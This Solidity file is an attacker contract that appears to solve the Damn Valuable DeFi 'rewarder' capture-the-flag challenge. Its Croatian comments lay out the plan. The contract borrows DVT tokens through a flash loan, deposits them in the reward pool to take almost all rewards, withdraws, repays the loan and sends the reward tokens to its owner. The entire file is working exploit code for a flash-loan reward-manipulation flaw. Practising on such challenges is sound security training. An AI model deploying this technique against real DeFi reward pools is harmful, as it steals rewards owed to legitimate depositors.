// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./RewardToken.sol";

interface IFlashLoanPool {
    function flashLoan(uint256 amount) external;
}
interface IRewardPool{
    function withdraw(uint256 amountToWithdraw) external;
    function deposit(uint256 amountToDeposit) external;
}
//CILJ-> DOBIT VISE REWARDA OD SVIH DRUGIH I PRIBLIZIT SE BLIZU 100 REWARD TOKENA
//PLAN
//1. UZMI FLASH LOAN U IZNOSU OD 1000000 DVT TOKENA
//2. DEPOSITAJ SREDSTVA NA REWARDERPOOL -> DOBIJAMO BLIZU 100 REWARD TOKENA
//3. WITHDRAWAJ SVA SREDSTVA SVOJA
//4. VRATI FLASHLOAN

contract RewardTokenAttacker {
    address internal owner;
    address public rewarderPoolAddress;
    address public flashLoanPoolAddress;
    DamnValuableToken public immutable liquidityToken;
    RewardToken public immutable rewardToken;
    uint256 public FLASH_LOAN_DVT_AMOUNT;

    constructor(uint256 flashLoanAmount,address rewardPoolAddress, address flashLoanAddress, address liquidityTokenAddress,address rewardTokenAddress)
    {
        owner=msg.sender;
        FLASH_LOAN_DVT_AMOUNT=flashLoanAmount;
        rewarderPoolAddress=rewardPoolAddress;
        flashLoanPoolAddress=flashLoanAddress;
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        rewardToken=RewardToken(rewardTokenAddress);
    }

    //poziva se od strane FlashLoanerPoola
    function receiveRewardTokens() external {
        require(msg.sender==owner,"Only owner can call this function");
        IFlashLoanPool(flashLoanPoolAddress).flashLoan(FLASH_LOAN_DVT_AMOUNT);
    }

    function receiveFlashLoan(uint256 amount) external {
        /*Approvaj rewarderPool contractu da moze radit s nasim tokenima -> msg.sender je contract */
        liquidityToken.approve(rewarderPoolAddress,amount);
        IRewardPool(rewarderPoolAddress).deposit(amount);
        IRewardPool(rewarderPoolAddress).withdraw(amount);
        //Vrati flash loan
        liquidityToken.transfer(flashLoanPoolAddress,amount);
        //transferiraj reward tokene na racun ownera
        rewardToken.transfer(owner,rewardToken.balanceOf(address(this)));
    }
}